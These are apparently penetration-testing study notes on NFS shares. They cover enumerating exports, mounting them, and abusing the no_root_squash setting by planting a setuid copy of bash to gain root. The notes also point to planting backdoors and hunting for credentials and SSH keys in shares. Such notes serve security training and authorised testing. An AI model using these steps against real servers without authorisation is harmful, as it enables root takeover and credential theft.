**Basic**
- **What:** Remote filesystem mounting (like mounting a drive over network)
- **Port:** 2049 (TCP/UDP)
- **Use:** Companies mount file servers for shared storage
- Linux focused (less common on Windows, but possible)

**Dangerous Settings**
- **no_root_squash:** Root on client = root on server (CRITICAL)
- **insecure:** Allow connections from ports >1024 (older systems)
- **rw (read-write):** Writable shares (can modify files)

**Quick Enumeration**
- **Show NFS Exports:**
	showmount -e [IP]
	- Lists all NFS shares and who can access them
	- Look for: Which shares are accessible to your IP?

**Mounting NFS Share**
- mkdir /mnt/nfs
- mount -t nfs [IP]:/path /mnt/nfs
- cd /mnt/nfs
- ls -la
	- If mounted successfully → explore files
	- If permission denied → check if no_root_squash is set

***NO_ROOT_SQUASH Exploitation***
- What it means: If you're root on client, you're root on NFS server
- Test if vulnerable:
- touch /mnt/nfs/test-file
- ls -la /mnt/nfs/test-file
	- If owner is root (you) → no_root_squash enabled → VULNERABLE

**Exploit:**
1. Mount share
2. Create file as root on client
3. File exists as root on server
4. Use this to plant shell/backdoor
5. Execute on target server

**Example:**
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
- Now bash has setuid bit
- Target can execute it as root = RCE

**Nmap Scan**
- nmap -sV -p2049 [IP]
- nmap -sV -p2049 --script=nfs* [IP]

**Workflow**
1. **Scan:** nmap -sV -p2049 [IP]
2. **Enumerate:** showmount -e [IP]
3. **Mount:** mount -t nfs [IP]:/path /mnt/nfs
4. **Explore:** ls -la /mnt/nfs
5. **Check permissions:** Can you write?
6. **Look for:** Credentials, config files, SSH keys
7. **If no_root_squash:** Plant shell/backdoor

**Red Flags**
- rw exports (writable)
- shares accessible to 0.0.0.0 (everyone)
- no_root_squash enabled
- Credentials stored in shares